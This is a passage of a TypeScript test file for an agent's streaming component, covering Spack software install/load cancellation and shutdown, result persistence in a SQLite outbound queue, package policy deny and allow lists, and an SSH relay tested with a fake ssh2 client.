    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
      installedSoftware: installed,
    });
    const snapshots: Array<Parameters<AgentStream["setInstalledSoftware"]>[0]> = [];
    const update = stream.setInstalledSoftware.bind(stream);
    stream.setInstalledSoftware = (specs) => {
      snapshots.push(specs);
      update(specs);
      if (specs.length === 1) finished.resolve();
    };
    activeStreams.push(stream);
    const running = stream.start();
    try {
      await entered.promise;
      await settle(20);
      expect(calls).toEqual(["import_preinstalled"]);
      release.resolve();
      await finished.promise;
      expect(calls).toEqual(["import_preinstalled", "load"]);
      expect(snapshots).toEqual([installed, [keep]]);
    } finally {
      release.resolve();
      stream.stop();
      await running;
    }
  });

  describe("software operation lifecycle cancellation", () => {
    async function lifecycleFixture(
      options: {
        timeoutMs?: number;
        outboundQueue?: OutboundQueue;
        readRequestsAfter?: Promise<void>;
        reachabilityProbe?: (signal: AbortSignal) => Promise<void>;
      } = {},
    ) {
      const closeFirst = Promise.withResolvers<void>();
      const reconnect = makeReplayReconnectClient(
        create(ServerMessageSchema, {
          payload: {
            case: "registerResponse",
            value: create(RegisterResponseSchema, { accepted: true }),
          },
        }),
        closeFirst.promise,
        options.readRequestsAfter,
      );
      const spackManager = await SpackManager.bootstrap({
        requireServerMaterials: true,
        spawner: {
          async run() {
            return { exitCode: 0, stdout: "1.0.0", stderr: "" };
          },
        },
      });
      const stream = new AgentStream({
        client: makeMockClient([]).client,
        clientFactory: reconnect.clientFactory,
        adapter: makeAdapter(),
        agentId: "agent-001",
        siteName: "test-site",
        heartbeatIntervalMs: 60_000,
        logger: silent,
        reconnectBackoffMs: 1,
        sleep: async () => {},
        spackManager,
        installedSoftware: [{ name: "hello", version: "1.0", hash: "invalid", spec: "hello@1.0" }],
        outboundQueue: options.outboundQueue,
        softwareOperationShutdownTimeoutMs: options.timeoutMs,
        reachabilityProbe: options.reachabilityProbe,
        reachabilityProbeIntervalMs: options.reachabilityProbe ? 1 : undefined,
        readGpuMetrics: async () => [],
        readDiskUsedPercent: async () => 0,
        readSchedulerQueueDepth: async () => 0,
      });
      activeStreams.push(stream);
      const running = stream.start();
      const request = (operationId: string) =>
        deliverServerMessage(
          stream,
          create(ServerMessageSchema, {
            payload: {
              case: "softwareOperationRequest",
              value: create(SoftwareOperationRequestSchema, {
                operationId,
                action: SoftwareOperationAction.LOAD,
                spec: "hello@1.0",
              }),
            },
          }),
        );
      const results = (connection: number) =>
        ((reconnect.sentByConnection[connection] ?? []) as AgentMessage[]).flatMap((message) =>
          message.payload.case === "softwareOperationResult" ? [message.payload.value] : [],
        );
      const waitForRegistration = (connection = 0) =>
        waitForCondition(() => reconnect.registrationProcessed.has(connection));
      return {
        stream,
        running,
        spackManager,
        closeFirst,
        reconnect,
        request,
        results,
        waitForRegistration,
      };
    }

    async function pendingSpillFixture(timeoutMs?: number) {
      const sqlite = new Database(":memory:");
      runSqliteMigrations(sqlite);
      const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
      const persist = outboundQueue.enqueueSoftwareOperationResult.bind(outboundQueue);
      const persistEntered = Promise.withResolvers<void>();
      const persistRelease = Promise.withResolvers<void>();
      const persisted = Promise.withResolvers<void>();
      let persistStarted = false;
      let persistFinished = false;
      outboundQueue.enqueueSoftwareOperationResult = async (item) => {
        if (item.status === SoftwareOperationStatus.SUCCEEDED) {
          persistStarted = true;
          persistEntered.resolve();
          await persistRelease.promise;
        }
        await persist(item);
        if (item.status === SoftwareOperationStatus.SUCCEEDED) {
          persistFinished = true;
          persisted.resolve();
        }
      };
      const transportRelease = Promise.withResolvers<void>();
      const probeEntered = Promise.withResolvers<void>();
      const probeRelease = Promise.withResolvers<void>();
      const f = await lifecycleFixture({
        timeoutMs,
        outboundQueue,
        readRequestsAfter: transportRelease.promise,
        reachabilityProbe: async () => {
          probeEntered.resolve();
          await probeRelease.promise;
        },
      });
      f.spackManager.runSoftwareOperation = async () => ({
        outcome: "succeeded",
        stdout: "",
        installed: [],
      });
      const state = f.stream as unknown as {
        outboundQueue: OutboundItem[];
        softwareOperationQueue: Promise<void>;
        pendingSoftwareResultSpills: Set<Promise<void>>;
      };
      const operationId = "00000000-0000-0000-0000-000000000044";
      return {
        ...f,
        outboundQueue,
        operationId,
        persistEntered,
        persistRelease,
        persisted,
        probeRelease,
        persistStarted: () => persistStarted,
        persistFinished: () => persistFinished,
        async prepare() {
          await probeEntered.promise;
          await f.request(operationId);
          await state.softwareOperationQueue;
          expect(
            state.outboundQueue.some(
              (item) =>
                item.kind === "softwareOperationResult" &&
                item.operationId === operationId &&
                item.status === SoftwareOperationStatus.SUCCEEDED,
            ),
          ).toBe(true);
          expect(persistStarted).toBe(false);
        },
        async dispose() {
          probeRelease.resolve();
          persistRelease.resolve();
          f.closeFirst.resolve();
          transportRelease.resolve();
          await f.stream.stop();
          await f.running;
          await state.softwareOperationQueue;
          await Promise.all(state.pendingSoftwareResultSpills);
          await f.reconnect.requestDoneByConnection[0];
          sqlite.close();
        },
      };
    }

    test("shutdown waits for the final disconnect and delayed spill of a completed software result", async () => {
      const f = await pendingSpillFixture();
      let startFinished = false;
      const finished = f.running.then(() => {
        startFinished = true;
      });
      let stopFinished = false;
      try {
        await f.prepare();
        const stopping = f.stream.stop().then(() => {
          stopFinished = true;
        });
        f.closeFirst.resolve();
        await settle();
        expect(f.persistStarted()).toBe(false);
        expect(stopFinished).toBe(false);
        expect(startFinished).toBe(false);
        f.probeRelease.resolve();
        await f.persistEntered.promise;
        await settle();
        expect(f.persistFinished()).toBe(false);
        expect(stopFinished).toBe(false);
        expect(startFinished).toBe(false);
        f.persistRelease.resolve();
        await Promise.all([stopping, finished]);
        expect(f.persistFinished()).toBe(true);
        const results = (await f.outboundQueue.loadForReplay()).flatMap(({ item }) =>
          item.kind === "softwareOperationResult" &&
          item.operationId === f.operationId &&
          item.status === SoftwareOperationStatus.SUCCEEDED
            ? [item]
            : [],
        );
        expect(results).toHaveLength(1);
      } finally {
        await f.dispose();
      }
    });

    test.each([
      "disconnect",
      "spill",
    ] as const)("the shared shutdown budget can expire during %s without cancelling result persistence", async (phase) => {
      const f = await pendingSpillFixture(0);
      try {
        await f.prepare();
        const stopping = f.stream.stop();
        f.closeFirst.resolve();
        if (phase === "spill") {
          f.probeRelease.resolve();
          await f.persistEntered.promise;
        }
        await stopping;
        expect(f.persistFinished()).toBe(false);
        if (phase === "disconnect") {
          expect(f.persistStarted()).toBe(false);
          f.probeRelease.resolve();
          await f.persistEntered.promise;
        }
        // start() must reuse the expired budget even when the last spill is registered later.
        await f.running;
        expect(f.persistFinished()).toBe(false);
        f.persistRelease.resolve();
        await f.persisted.promise;
        expect(f.persistFinished()).toBe(true);
      } finally {
        await f.dispose();
      }
    });

    test("stop and start wait for cleanup, withdrawal and persistence; queued work never starts", async () => {
      const sqlite = new Database(":memory:");
      runSqliteMigrations(sqlite);
      const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
      const persist = outboundQueue.enqueueSoftwareOperationResult.bind(outboundQueue);
      const persistEntered = Promise.withResolvers<void>();
      const persistRelease = Promise.withResolvers<void>();
      outboundQueue.enqueueSoftwareOperationResult = async (item) => {
        if (item.status === SoftwareOperationStatus.FAILED) {
          persistEntered.resolve();
          await persistRelease.promise;
        }
        await persist(item);
      };
      const f = await lifecycleFixture({ outboundQueue });
      const entered = Promise.withResolvers<void>();
      const aborted = Promise.withResolvers<void>();
      const cleanupEntered = Promise.withResolvers<void>();
      const cleanupRelease = Promise.withResolvers<void>();
      const signals: Array<AbortSignal | undefined> = [];
      const snapshots: Array<Parameters<AgentStream["setInstalledSoftware"]>[0]> = [];
      const update = f.stream.setInstalledSoftware.bind(f.stream);
      f.stream.setInstalledSoftware = (specs) => {
        snapshots.push(specs);
        update(specs);
      };
      f.spackManager.runSoftwareOperation = async (_action, _spec, _materials, signal) => {
        signals.push(signal);
        signal?.addEventListener("abort", () => aborted.resolve(), { once: true });
        entered.resolve();
        await aborted.promise;
        cleanupEntered.resolve();
        await cleanupRelease.promise;
        return {
          outcome: "failed",
          exitCode: 1,
          stderr: "managed verification cancelled",
          invalidatedHashes: ["invalid"],
        };
      };
      let startFinished = false;
      const finished = f.running.then(() => {
        startFinished = true;
      });
      let stopFinished = false;
      try {
        await f.waitForRegistration();
        await f.request("00000000-0000-0000-0000-000000000040");
        await entered.promise;
        await f.request("00000000-0000-0000-0000-000000000041");
        const stopping = f.stream.stop();
        expect(f.stream.stop()).toBe(stopping);
        const stopped = stopping.then(() => {
          stopFinished = true;
        });
        f.closeFirst.resolve();
        expect(signals[0]?.aborted).toBe(true);
        await cleanupEntered.promise;
        await settle();
        expect(startFinished).toBe(false);
        expect(stopFinished).toBe(false);
        cleanupRelease.resolve();
        await persistEntered.promise;
        await settle();
        expect(snapshots).toEqual([[]]);
        expect(startFinished).toBe(false);
        expect(stopFinished).toBe(false);
        persistRelease.resolve();
        await Promise.all([stopped, finished]);
        expect(signals).toHaveLength(1);
        const failed = (await outboundQueue.loadForReplay()).flatMap(({ item }) =>
          item.kind === "softwareOperationResult" && item.status === SoftwareOperationStatus.FAILED
            ? [item]
            : [],
        );
        expect(failed.map((item) => item.operationId)).toEqual([
          "00000000-0000-0000-0000-000000000040",
          "00000000-0000-0000-0000-000000000041",
        ]);
        expect(failed[0]?.stderr).toBe("managed verification cancelled");
        expect(failed[1]?.error).toBe("Agent stopped before queued software operation could begin");
      } finally {
        aborted.resolve();
        cleanupRelease.resolve();
        persistRelease.resolve();
        f.closeFirst.resolve();
        await f.stream.stop();
        await finished;
        sqlite.close();
      }
    });

    test("connection loss does not abort software and the new connection reports its result", async () => {
      const f = await lifecycleFixture();
      const entered = Promise.withResolvers<void>();
      const release = Promise.withResolvers<void>();
      const signals: Array<AbortSignal | undefined> = [];
      f.spackManager.runSoftwareOperation = async (_action, _spec, _materials, signal) => {
        signals.push(signal);
        entered.resolve();
        await release.promise;
        return { outcome: "succeeded", stdout: "export PATH=/srv/kq/bin:$PATH;", installed: [] };
      };
      try {
        await f.waitForRegistration();
        await f.request("00000000-0000-0000-0000-000000000042");
        await entered.promise;
        await waitForCondition(() => f.results(0).length > 0);
        f.closeFirst.resolve();
        await f.waitForRegistration(1);
        expect(signals).toHaveLength(1);
        expect(signals[0]?.aborted).toBe(false);
        release.resolve();
        await waitForCondition(() =>
          f.results(1).some((item) => item.status === SoftwareOperationStatus.SUCCEEDED),
        );
        expect(signals[0]?.aborted).toBe(false);
        expect(f.results(1).some((item) => item.status === SoftwareOperationStatus.FAILED)).toBe(
          false,
        );
      } finally {
        release.resolve();
        f.closeFirst.resolve();
        await f.stream.stop();
        await f.running;
      }
      expect(signals[0]?.aborted).toBe(true);
    });

    test("shutdown wait is bounded without cancelling later cleanup or result persistence", async () => {
      const sqlite = new Database(":memory:");
      runSqliteMigrations(sqlite);
      const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
      const f = await lifecycleFixture({ timeoutMs: 0, outboundQueue });
      const entered = Promise.withResolvers<void>();
      const release = Promise.withResolvers<void>();
      let completed = false;
      const signals: Array<AbortSignal | undefined> = [];
      f.spackManager.runSoftwareOperation = async (_action, _spec, _materials, signal) => {
        signals.push(signal);
        entered.resolve();
        await release.promise;
        completed = true;
        throw new Error("private runtime cancellation detail");
      };
      const operationId = "00000000-0000-0000-0000-000000000043";
      const failedResults = async () =>
        (await outboundQueue.loadForReplay()).flatMap(({ item }) =>
          item.kind === "softwareOperationResult" &&
          item.operationId === operationId &&
          item.status === SoftwareOperationStatus.FAILED
            ? [item]
            : [],
        );
      try {
        await f.waitForRegistration();
        await f.request(operationId);
        await entered.promise;
        const stopping = f.stream.stop();
        f.closeFirst.resolve();
        await Promise.all([stopping, f.running]);
        expect(signals[0]?.aborted).toBe(true);
        expect(completed).toBe(false);
        release.resolve();
        await waitForCondition(async () => (await failedResults()).length === 1);
        expect(completed).toBe(true);
        expect((await failedResults())[0]?.error).toBe(
          "Software operation cancelled during Agent shutdown",
        );
      } finally {
        release.resolve();
        f.closeFirst.resolve();
        await f.stream.stop();
        await f.running;
        await (f.stream as unknown as { softwareOperationQueue: Promise<void> })
          .softwareOperationQueue;
        sqlite.close();
      }
    });
  });

  test("inbound SoftwareOperationRequest emits failed result when execution throws", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwareOperationRequest",
          value: create(SoftwareOperationRequestSchema, {
            operationId: "00000000-0000-0000-0000-000000000015",
            action: SoftwareOperationAction.INSTALL,
            spec: "zlib@1.3",
            requestedBy: "admin@test",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);
    const stubSpawner: Spawner = {
      async run(cmd) {
        if (cmd[1] === "--version") return { exitCode: 0, stdout: "0.22.1", stderr: "" };
        if (cmd[1] === "install") throw new Error("spack process spawn failed");
        return { exitCode: 1, stdout: "", stderr: `unexpected command: ${cmd.join(" ")}` };
      },
    };
    const spackManager = await SpackManager.bootstrap({ spawner: stubSpawner });
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(30);
    stream.stop();
    await runPromise;

    const results = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "softwareOperationResult",
    ) as Array<{
      payload: {
        value: {
          status: SoftwareOperationStatus;
          spec: string;
          error: string;
          exitCode: number;
        };
      };
    }>;
    expect(results.map((r) => r.payload.value.status)).toContain(SoftwareOperationStatus.RUNNING);
    const failed = results.find((r) => r.payload.value.status === SoftwareOperationStatus.FAILED);
    expect(failed?.payload.value.spec).toBe("zlib@1.3");
    expect(failed?.payload.value.error).toBe(
      "software operation failed: spack process spawn failed",
    );
    expect(failed?.payload.value.exitCode).toBe(0);
  });

  test("inbound load SoftwareOperationRequest is rejected by cached Spack policy", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwarePolicyUpdate",
          value: create(SoftwarePolicyUpdateSchema, {
            policyVersion: "v-load-deny",
            lockEnabled: false,
            denyList: ["lammps@*"],
          }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwareOperationRequest",
          value: create(SoftwareOperationRequestSchema, {
            operationId: "00000000-0000-0000-0000-000000000011",
            action: SoftwareOperationAction.LOAD,
            spec: "lammps@2024.1",
            requestedBy: "admin@test",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);
    const calls: string[][] = [];
    const stubSpawner: Spawner = {
      async run(cmd) {
        calls.push(cmd);
        if (cmd[1] === "--version") return { exitCode: 0, stdout: "0.22.1", stderr: "" };
        return { exitCode: 1, stdout: "", stderr: `unexpected command: ${cmd.join(" ")}` };
      },
    };
    const spackManager = await SpackManager.bootstrap({ spawner: stubSpawner });
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(30);
    stream.stop();
    await runPromise;

    const results = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "softwareOperationResult",
    ) as Array<{
      payload: {
        value: {
          action: SoftwareOperationAction;
          status: SoftwareOperationStatus;
          error: string;
        };
      };
    }>;
    expect(results.map((r) => r.payload.value.status)).not.toContain(
      SoftwareOperationStatus.RUNNING,
    );
    const rejected = results.find(
      (r) => r.payload.value.status === SoftwareOperationStatus.REJECTED,
    );
    expect(rejected?.payload.value.action).toBe(SoftwareOperationAction.LOAD);
    expect(rejected?.payload.value.error).toMatch(/denyList/);
    expect(calls).toEqual([["spack", "--version"]]);
  });

  test("inbound uninstall SoftwareOperationRequest is rejected by cached Spack policy", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwarePolicyUpdate",
          value: create(SoftwarePolicyUpdateSchema, {
            policyVersion: "v-uninstall-lock",
            lockEnabled: true,
            allowList: ["gromacs@*"],
          }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwareOperationRequest",
          value: create(SoftwareOperationRequestSchema, {
            operationId: "00000000-0000-0000-0000-000000000013",
            action: SoftwareOperationAction.UNINSTALL,
            spec: "lammps@2024.1",
            requestedBy: "admin@test",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);
    const calls: string[][] = [];
    const stubSpawner: Spawner = {
      async run(cmd) {
        calls.push(cmd);
        if (cmd[1] === "--version") return { exitCode: 0, stdout: "0.22.1", stderr: "" };
        return { exitCode: 1, stdout: "", stderr: `unexpected command: ${cmd.join(" ")}` };
      },
    };
    const spackManager = await SpackManager.bootstrap({ spawner: stubSpawner });
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(30);
    stream.stop();
    await runPromise;

    const results = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "softwareOperationResult",
    ) as Array<{
      payload: {
        value: {
          action: SoftwareOperationAction;
          status: SoftwareOperationStatus;
          error: string;
        };
      };
    }>;
    expect(results.map((r) => r.payload.value.status)).not.toContain(
      SoftwareOperationStatus.RUNNING,
    );
    const rejected = results.find(
      (r) => r.payload.value.status === SoftwareOperationStatus.REJECTED,
    );
    expect(rejected?.payload.value.action).toBe(SoftwareOperationAction.UNINSTALL);
    expect(rejected?.payload.value.error).toMatch(/lock enabled|allowList/);
    expect(calls).toEqual([["spack", "--version"]]);
  });

  test("inbound SoftwareOperationRequest rejects blank specs before invoking Spack", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwareOperationRequest",
          value: create(SoftwareOperationRequestSchema, {
            operationId: "00000000-0000-0000-0000-000000000012",
            action: SoftwareOperationAction.INSTALL,
            spec: "   ",
            requestedBy: "admin@test",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);
    const calls: string[][] = [];
    const stubSpawner: Spawner = {
      async run(cmd) {
        calls.push(cmd);
        if (cmd[1] === "--version") return { exitCode: 0, stdout: "0.22.1", stderr: "" };
        return { exitCode: 1, stdout: "", stderr: `unexpected command: ${cmd.join(" ")}` };
      },
    };
    const spackManager = await SpackManager.bootstrap({ spawner: stubSpawner });
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(30);
    stream.stop();
    await runPromise;

    const results = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "softwareOperationResult",
    ) as Array<{
      payload: {
        value: {
          status: SoftwareOperationStatus;
          spec: string;
          error: string;
        };
      };
    }>;
    const rejected = results.find(
      (r) => r.payload.value.status === SoftwareOperationStatus.REJECTED,
    );
    expect(results.map((r) => r.payload.value.status)).not.toContain(
      SoftwareOperationStatus.RUNNING,
    );
    expect(rejected?.payload.value.spec).toBe("");
    expect(rejected?.payload.value.error).toBe("spec is empty");
    expect(calls).toEqual([["spack", "--version"]]);
  });

  test("inbound SoftwareOperationRequest fails without running when Spack is unavailable", async () => {
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "softwareOperationRequest",
          value: create(SoftwareOperationRequestSchema, {
            operationId: "00000000-0000-0000-0000-000000000014",
            action: SoftwareOperationAction.INSTALL,
            spec: "zlib@1.3",
            requestedBy: "admin@test",
          }),
        },
      }),
    ];
    const { client, sent } = makeMockClient(serverMsgs);
    const stubSpawner: Spawner = {
      async run(cmd) {
        if (cmd[1] === "--version") return { exitCode: 1, stdout: "", stderr: "missing spack" };
        return { exitCode: 1, stdout: "", stderr: `unexpected command: ${cmd.join(" ")}` };
      },
    };
    const spackManager = await SpackManager.bootstrap({ spawner: stubSpawner });
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      spackManager,
    });
    activeStreams.push(stream);

    const runPromise = stream.start();
    await settle(30);
    stream.stop();
    await runPromise;

    const results = sent.filter(
      (m) => (m as { payload: { case: string } }).payload.case === "softwareOperationResult",
    ) as Array<{
      payload: {
        value: {
          status: SoftwareOperationStatus;
          error: string;
        };
      };
    }>;
    expect(results.map((r) => r.payload.value.status)).not.toContain(
      SoftwareOperationStatus.RUNNING,
    );
    const failed = results.find((r) => r.payload.value.status === SoftwareOperationStatus.FAILED);
    expect(failed?.payload.value.error).toBe("spack is unavailable on this Agent");
  });

  test("persists software operation results while the stream is offline", async () => {
    const sqlite = new Database(":memory:");
    runSqliteMigrations(sqlite);
    const outboundQueue = new OutboundQueue(drizzle(sqlite, { schema }));
    const { client } = makeMockClient([]);
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      outboundQueue,
      reconnectBackoffMs: 1,
      sleep: async () => {},
    });
    const offlineStream = stream as unknown as {
      enqueueSoftwareOperationResult(
        item: Omit<Extract<OutboundItem, { kind: "softwareOperationResult" }>, "kind">,
      ): Promise<void>;
    };

    await offlineStream.enqueueSoftwareOperationResult({
      operationId: "00000000-0000-0000-0000-000000000099",
      action: SoftwareOperationAction.INSTALL,
      status: SoftwareOperationStatus.SUCCEEDED,
      spec: "zlib@1.3",
      exitCode: 0,
      installed: [{ name: "zlib", version: "1.3", hash: "abc", spec: "zlib@1.3" }],
    });
    const replayed = (await outboundQueue.loadForReplay())[0]?.item;
    if (!replayed || replayed.kind !== "softwareOperationResult") {
      throw new Error("expected softwareOperationResult item");
    }
    expect(replayed.operationId).toBe("00000000-0000-0000-0000-000000000099");
    expect(replayed.status).toBe(SoftwareOperationStatus.SUCCEEDED);
    expect(replayed.installed?.[0]?.name).toBe("zlib");
    sqlite.close();
  });
});

// Minimal fake ssh2 client — same shape as ssh/handler.test.ts, trimmed to the
// bits the stream-level wiring test needs: a `ready` event that opens a shell
// channel so the session counts as active.
function fakeSsh2Factory(): {
  factory: Ssh2Factory;
  fireReady: () => void;
  setWindowCalls: Array<[number, number, number, number]>;
  writes: Array<Uint8Array | string>;
  channelEnded: () => boolean;
} {
  const readyCbs: Array<() => void> = [];
  const setWindowCalls: Array<[number, number, number, number]> = [];
  const writes: Array<Uint8Array | string> = [];
  let ended = false;
  const fake = {
    on: (event: string, cb: (...a: unknown[]) => void) => {
      if (event === "ready") readyCbs.push(cb as () => void);
      return fake;
    },
    shell: (cb: (err: Error | undefined, stream: unknown) => void) => {
      const stream = {
        on: () => stream,
        stderr: { on: () => stream.stderr },
        write: (b: Uint8Array | string) => {
          writes.push(b);
        },
        end: () => {
          ended = true;
        },
        setWindow: (rows: number, cols: number, h: number, w: number) =>
          setWindowCalls.push([rows, cols, h, w]),
      };
      cb(undefined, stream);
      return true;
    },
    connect: () => fake,
    end: () => {
      ended = true;
      return fake;
    },
  } as unknown as Ssh2ClientLike;
  return {
    factory: () => fake,
    fireReady: () => {
      for (const cb of readyCbs) cb();
    },
    setWindowCalls,
    writes,
    channelEnded: () => ended,
  };
}

describe("AgentStream SSH relay", () => {
  test("routes a Server SshOpen to the wired handler and tears it down on stop()", async () => {
    const { factory, fireReady } = fakeSsh2Factory();
    let handler: SshHandler | undefined;

    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sshOpen",
          value: create(SshOpenSchema, {
            sessionId: "s1",
            host: "login01",
            port: 22,
            username: "alice",
            auth: create(SshAuthSchema, { password: "pw" }),
          }),
        },
      }),
    ];
    // Hold the response stream open so we can fire `ready` and inspect state
    // before the stream tears down.
    const { client } = makeMockClient(serverMsgs, 200);

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      sshHandlerFactory: (enqueue) => {
        handler = new SshHandler({ enqueue, logger: silent, ssh2Factory: factory });
        return handler;
      },
    });
    activeStreams.push(stream);

    void stream.start();
    await settle(20);

    // The SshOpen was routed through the stream into the real handler, not the
    // synthetic "ssh handler disabled" close. Firing `ready` opens the shell.
    fireReady();
    await settle(5);
    expect(handler?.activeCount()).toBe(1);

    // stop() must tear down active SSH sessions — otherwise an agent restart
    // leaks half-open ssh2 channels on cluster login nodes.
    stream.stop();
    await settle(5);
    expect(handler?.activeCount()).toBe(0);
  });

  test("tears down ssh2 sessions when the Server stream drops, before reconnecting", async () => {
    const shutdownReasons: string[] = [];
    const spyHandler = {
      handleOpen: () => {},
      handleData: () => {},
      handleResize: () => {},
      handleClose: () => {},
      shutdown: (reason: string) => {
        shutdownReasons.push(reason);
      },
      activeCount: () => 0,
    } as unknown as SshHandler;

    // Stream yields a register ack then ends immediately (holdOpenMs=0),
    // simulating an unexpected Server-stream drop that triggers the reconnect path.
    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs, 0);

    let sleeps = 0;
    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      // Stop after the first reconnect backoff so the loop doesn't spin forever.
      sleep: async () => {
        sleeps++;
        if (sleeps === 1) stream.stop();
      },
      sshHandlerFactory: () => spyHandler,
    });
    activeStreams.push(stream);

    void stream.start();
    await settle(30);

    // The reconnect path must tear down orphaned ssh2 channels with a distinct
    // reason — separate from the explicit-stop "agent shutdown" — so they don't
    // leak on the login node after a Server↔Agent partition.
    expect(shutdownReasons).toContain("server stream lost");
  });

  test("routes a Server SshResize through to the ssh2 channel's setWindow", async () => {
    const { factory, fireReady, setWindowCalls } = fakeSsh2Factory();

    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sshOpen",
          value: create(SshOpenSchema, {
            sessionId: "s1",
            host: "login01",
            port: 22,
            username: "alice",
            auth: create(SshAuthSchema, { password: "pw" }),
          }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sshResize",
          value: create(SshResizeSchema, { sessionId: "s1", cols: 120, rows: 40 }),
        },
      }),
    ];
    const { client } = makeMockClient(serverMsgs, 200);

    const stream = new AgentStream({
      fileTransferMaxRetries: 3,
      fileTransferRetryBackoffSec: 0,
      client,
      adapter: makeAdapter(),
      agentId: "agent-001",
      siteName: "test-site",
      heartbeatIntervalMs: 60_000,
      logger: silent,
      reconnectBackoffMs: 1,
      sleep: async () => {},
      sshHandlerFactory: (enqueue) =>
        new SshHandler({ enqueue, logger: silent, ssh2Factory: factory }),
    });
    activeStreams.push(stream);

    void stream.start();
    await settle(20);

    // SshOpen + SshResize were both dispatched before the channel opened, so the
    // resize buffered; firing `ready` opens the shell and applies it. This proves
    // the stream-level `sshResize` routing reaches the real ssh2 channel.
    fireReady();
    await settle(5);
    expect(setWindowCalls).toEqual([[40, 120, 0, 0]]);

    stream.stop();
  });

  test("routes Server SshData through to the ssh2 channel as stdin", async () => {
    const { factory, fireReady, writes } = fakeSsh2Factory();

    const serverMsgs = [
      create(ServerMessageSchema, {
        payload: {
          case: "registerResponse",
          value: create(RegisterResponseSchema, { accepted: true, message: "ok" }),
        },
      }),
      create(ServerMessageSchema, {
        payload: {
          case: "sshOpen",
